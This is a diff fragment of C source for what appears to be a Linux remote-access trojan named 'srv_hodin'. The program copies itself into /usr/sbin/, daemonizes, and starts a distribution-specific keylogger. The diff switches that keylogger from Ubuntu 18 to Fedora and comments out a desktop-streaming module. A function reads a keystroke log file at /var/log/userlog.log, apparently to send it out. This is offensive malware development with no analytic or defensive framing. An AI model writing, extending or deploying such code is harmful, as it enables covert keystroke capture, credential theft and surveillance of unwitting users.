@@ -69,7 +69,7 @@ int main(int argc, char *argv[])
 
     /** Copy executable file in /usr/sbin/ **/
     if(system("cp srv_hodin /usr/sbin/") == -1)
-    {
+   {
         error("system() copy srv_hodin in /usr/sbin/", "main()");
         return 0;
     }
@@ -83,9 +83,10 @@ int main(int argc, char *argv[])
     
     daemonize();   
     
+   
     //ubuntu16_keylogger_init();
 
-    ubuntu18_keylogger_init();
+    //ubuntu18_keylogger_init();
 
     //mint_keylogger_init();
 
@@ -93,7 +94,7 @@ int main(int argc, char *argv[])
 
     //kali_keylogger_init();
 
-    //fedora_keylogger_init();
+    fedora_keylogger_init();
     
     /* Initialize GStreamer */
     gst_init(&argc, &argv);
@@ -351,6 +352,7 @@ void dispatch_modules(int argc, char *argv[])
         }
         
         
+        /*
         if(flag == 13)
         {
             printf("\t\tDESKTOP STREAMING STARTED....\n");
@@ -368,6 +370,7 @@ void dispatch_modules(int argc, char *argv[])
                 return;
             }
         }
+        */
 
         if(flag == 14)
         {
@@ -453,11 +456,11 @@ void *send_logger_log()
     char buffer[BUFSIZ] = "";
     int log_empty = 0;
 
-     int i = 0;
+    int i = 0;
     
     log_file = fopen("/var/log/userlog.log", "r+");
     if(log_file == NULL)
-    { 
+    {
         error("fopen() log_file", "send_logger_log()");
         pthread_exit(NULL);
     }
